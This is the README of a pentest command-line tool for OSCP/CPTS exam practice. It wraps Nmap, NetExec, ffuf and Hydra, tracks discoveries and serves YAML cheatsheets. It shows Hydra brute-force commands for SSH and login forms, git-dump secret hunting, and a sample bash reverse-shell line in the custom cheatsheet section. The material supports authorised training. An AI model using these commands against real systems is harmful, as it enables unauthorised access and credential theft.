# C.A.P.O - Context-Aware Pentest Orchestrator

> **Your OSCP/CPTS Exam Companion** — Automates recon grunt work, remembers everything, suggests the right command at the right time.

```
   ██████╗ ██╗ █████╗ ██████╗  ██████╗
  ██╔════╝ ██║██╔══██╗██╔══██╗██╔═══██╗
  ██║      ██║███████║██████╔╝██║   ██║
  ██║      ██║██╔══██║██╔═══╝ ██║   ██║
  ╚██████╗ ██║██║  ██║██║     ╚██████╔╝
   ╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

## Philosophy

- **No Auto-Pwn** — C.A.P.O automates *reconnaissance*, not exploitation. Every command is printed before execution.
- **Exam Compliant** — Built with OSCP/CPTS rules in mind. OSCP mode disables LLM features.
- **State-Aware** — Remembers your discoveries (ports, users, creds, dirs) and suggests next steps.
- **Ready Out-of-the-Box** — Ships with 100+ curated commands from HackTricks, PayloadsAllTheThings, GTFOBins.

## Quick Install

```bash
cd /path/to/capo
pip install -e .
```

## Quick Start

```bash
# Set your target
capo target set 10.10.10.100 --domain corp.local

# Connect targets to an active campaign
capo target campaign my-ad-lab

# Run full recon pipeline
capo scan full

# Or step by step
capo scan quick                      # All ports fast scan
capo scan detailed                   # -sC -sV on open ports

# SMB enumeration
capo nxc null                        # Null session
capo nxc rid-brute                   # RID brute force users

# Password bruteforce (Hydra)
capo brute ssh -u root -p toor       # SSH single credential check
capo brute ssh -U users.txt -P passwords.txt   # SSH list bruteforce
capo brute http-post --form '/login.php:username=^USER^&password=^PASS^:F=Invalid' -U users.txt -P passwords.txt
capo brute http-get --form '/login.php:username=^USER^&password=^PASS^:F=Invalid' -U users.txt -P passwords.txt
capo brute web-form -m https-post-form --form '/auth:username=^USER^&password=^PASS^:F=invalid' -U users.txt -P passwords.txt

# Web fuzzing
capo web fuzz                        # Directory fuzzing
capo web fuzz --port 443 --https     # HTTPS fuzzing
capo web fuzz --host domain -d app.corp.local   # Fuzz by domain/subdomain
capo web vhost -d corp.local         # Virtual host discovery
capo web subdns -d corp.local        # DNS subdomain enumeration

# If .git directory is discovered during fuzzing:
# capo suggest will alert with the full runbook hints
capo query git-detect                # Confirm .git exposure
capo query git-dump                  # Dump with git-dumper
capo query git-grep-secrets          # Grep source for hardcoded secrets
capo query git-trufflehog            # Automated secret scanner

# Search cheatsheets (the killer feature)
capo search kerberos                 # Find Kerberos commands
capo search "privesc linux"          # Linux privilege escalation
capo query smb                       # Quick SMB commands
capo search "reverse shell bash"     # Reverse shells

# Copy command to clipboard with --copy
capo search asrep --copy

# Check state and suggestions
capo state show                      # Current target summary
capo state ports                     # Discovered ports
capo state users                     # Discovered users
capo suggest                         # Context-aware suggestions

# Exam mode
capo mode set oscp                   # Strict OSCP mode (no LLM)
capo mode set cpts                   # CPTS mode (all features)
capo mode show                       # Show current mode
```

## Architecture

```
~/.capo/
├── campaigns/               # Multi-host engagement contexts
│   └── my-ad-lab/
│       ├── campaign.json    # AD domain, global users & credentials
│       └── loot/            # Global wordlists (users.txt, passwords.txt)
├── workspaces/              # Per-target workspaces
│   └── 10.10.10.100/
│       ├── state.json       # Target intelligence DB
│       ├── notes.md         # Auto-generated report template
│       ├── scans/           # Raw tool outputs (Nmap XML, ffuf JSON)
│       ├── loot/            # Target-specific hashes, SSH keys
│       ├── exploits/        # Downloaded exploits
│       └── evidence/        # Screenshots, proof
├── custom_cheatsheets/      # Your personal YAML commands
└── config.json              # Global config

capo/
├── cli/                     # CLI commands (Typer)
│   ├── main.py              # CLI entry point
│   └── target.py, scan.py...
├── config.py                # Paths, profiles, constants
├── state.py                 # State Manager (per-target JSON + FileLock)
├── campaign.py              # Campaign Manager (engagement-wide JSON)
├── core_cheatsheets/        # Built-in command database (YAML)
│   ├── recon_network.yaml
│   ├── recon_web.yaml
│   ├── smb.yaml
│   ├── active_directory.yaml
│   ├── privesc_linux.yaml
│   ├── privesc_windows.yaml
│   ├── shells_transfer.yaml
│   ├── services.yaml
│   ├── password_cracking.yaml
│   ├── pivoting.yaml
│   └── web_attacks.yaml
├── modules/
│   ├── mode.py              # OSCP/CPTS mode manager
│   ├── triggers.py          # Context-aware suggestion engine
│   ├── wrappers/
│   │   ├── base.py          # Base wrapper class
│   │   ├── nmap_wrapper.py  # Nmap integration + XML parser
│   │   ├── nxc_wrapper.py   # NetExec/CME integration
│   │   ├── web_wrapper.py   # ffuf web fuzz + vhost + subdns integration
│   │   └── brute_wrapper.py # Hydra SSH/web form bruteforce integration
│   └── cheatsheet/
│       └── engine.py        # YAML cheatsheet engine + fuzzy search
└── utils/
    └── display.py           # Rich terminal formatting
```

## Scan Profiles

| Profile    | Nmap Rate | Nmap Timing | ffuf Threads | Use Case |
|------------|-----------|-------------|--------------|----------|
| aggressive | 5000      | -T4         | 80           | Lab/CTF  |
| normal     | 1000      | -T3         | 40           | Default  |
| stealth    | 300       | -T2         | 10           | Fragile targets |

```bash
capo scan quick --profile aggressive
capo web fuzz --profile stealth
```

## Custom Cheatsheets

Add YAML files to `~/.capo/custom_cheatsheets/`:

```yaml
category: "my-custom"
description: "My personal commands"
commands:
  - name: "my-revshell"
    description: "My go-to reverse shell"
    command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    tool: "bash"
    tags: ["shell", "custom"]
    os: "linux"
    exam: ["oscp", "cpts"]
```

Variables auto-injected from state: `{IP}`, `{DOMAIN}`, `{USER}`, `{PASS}`, `{USERFILE}`, `{PASSFILE}`, `{DC_IP}`, `{LHOST}`, `{LPORT}`, `{HOSTNAME}`, `{USERS_FILE}`, `{HASHES_FILE}`.

## OSCP vs CPTS Mode

| Feature | OSCP Mode | CPTS Mode |
|---------|-----------|-----------|
| Recon Wrappers | ✅ | ✅ |
| Cheatsheet Engine | ✅ | ✅ |
| State Management | ✅ | ✅ |
| Context Suggestions | ✅ | ✅ |
| LLM/AI Features | ❌ | ✅ (Phase 4) |
| Pivoting Helpers | ✅ | ✅ (Enhanced) |
| Metasploit | 1 machine only | Unrestricted |

## Roadmap

- [x] **Phase 1:** Core architecture, State Manager, CLI
- [x] **Phase 2:** Tool wrappers (Nmap, NetExec, ffuf), parsers
- [x] **Phase 3:** Cheatsheet Engine, fuzzy search, variable injection
- [ ] **Phase 4:** AI/LLM integration (CPTS mode only)
- [x] **Phase 5:** Field testing on HTB/Proving Grounds

## License

MIT License
